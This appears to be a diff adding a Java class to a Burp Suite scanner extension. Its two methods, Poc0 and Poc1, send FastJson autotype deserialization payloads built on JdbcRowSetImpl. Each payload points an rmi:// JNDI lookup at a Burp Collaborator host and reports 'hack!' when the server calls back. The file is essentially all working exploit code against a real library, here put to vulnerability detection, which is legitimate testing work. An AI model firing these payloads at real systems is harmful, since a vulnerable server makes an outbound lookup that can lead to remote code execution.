@@ -1,0 +1,90 @@
+package burp.vuls;
+
+import burp.*;
+import burp.util.HttpRequestThread;
+import burp.util.HttpResult;
+
+import java.io.IOException;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.util.List;
+
+public class FastJson {
+
+    public static IExtensionHelpers helpers;
+    public static IBurpExtenderCallbacks callbacks;
+    public static List<BurpExtender.LogEntry> log;
+    public static IHttpRequestResponse messageInfo;
+
+    public static void Poc0() {
+        // TODO 待完成
+        IBurpCollaboratorClientContext collaboratorClientContext = callbacks.createBurpCollaboratorClientContext();
+        String val = collaboratorClientContext.generatePayload(true);
+        // 据说可以覆盖所有版本
+        String poc = "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"is\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val + "/aaa\",\"autoCommit\":true}}";
+
+        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
+        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
+        HttpRequestThread httpRequestThread = new HttpRequestThread(helpers, callbacks, messageInfo, poc.getBytes());
+        Thread thread = new Thread(httpRequestThread);
+        thread.start();
+        try {
+            // 等待10s
+            Thread.sleep(10000);
+        } catch (InterruptedException e) {
+            OutputStream out = callbacks.getStderr();
+            PrintWriter p = new PrintWriter(out);
+            e.printStackTrace(p);
+            try {
+                p.flush();
+                out.flush();
+            } catch (IOException ioException) {
+                ioException.printStackTrace();
+            }
+        }
+        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
+        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
+            log.add(new BurpExtender.LogEntry(log.size(), callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.host, httpResult.path, httpResult.method, httpResult.status, "Poc0 hack!"));
+        } else if (collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0){
+            log.add(new BurpExtender.LogEntry(log.size(), callbacks.saveBuffersToTempFiles(messageInfo), "", "", "", (short) 0, "Poc0 hack!"));
+        }else {
+            log.add(new BurpExtender.LogEntry(log.size(), callbacks.saveBuffersToTempFiles(messageInfo), "", "", "", (short) 0, "Poc0 pass"));
+        }
+    }
+
+    public static void Poc1() {
+        // TODO 待完成
+        IBurpCollaboratorClientContext collaboratorClientContext = callbacks.createBurpCollaboratorClientContext();
+        String val = collaboratorClientContext.generatePayload(true);
+        // 据说可以覆盖所有版本
+        String poc = "{\"handsome\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/aaa\",\"autoCommit\":true}}";
+
+        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
+        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
+        HttpRequestThread httpRequestThread = new HttpRequestThread(helpers, callbacks, messageInfo, poc.getBytes());
+        try {
+            Thread thread = new Thread(httpRequestThread);
+            thread.start();
+            // 等待10s
+            Thread.sleep(10000);
+        } catch (Exception e) {
+            OutputStream out = callbacks.getStderr();
+            PrintWriter p = new PrintWriter(out);
+            e.printStackTrace(p);
+            try {
+                p.flush();
+                out.flush();
+            } catch (IOException ioException) {
+                ioException.printStackTrace();
+            }
+        }
+        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
+        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
+            log.add(new BurpExtender.LogEntry(log.size(), callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.host, httpResult.path, httpResult.method, httpResult.status, "Poc0 hack!"));
+        } else if (collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0){
+            log.add(new BurpExtender.LogEntry(log.size(), callbacks.saveBuffersToTempFiles(messageInfo), "", "", "", (short) 0, "Poc1 hack!"));
+        }else {
+            log.add(new BurpExtender.LogEntry(log.size(), callbacks.saveBuffersToTempFiles(messageInfo), "", "", "", (short) 0, "Poc1 pass"));
+        }
+    }
+}
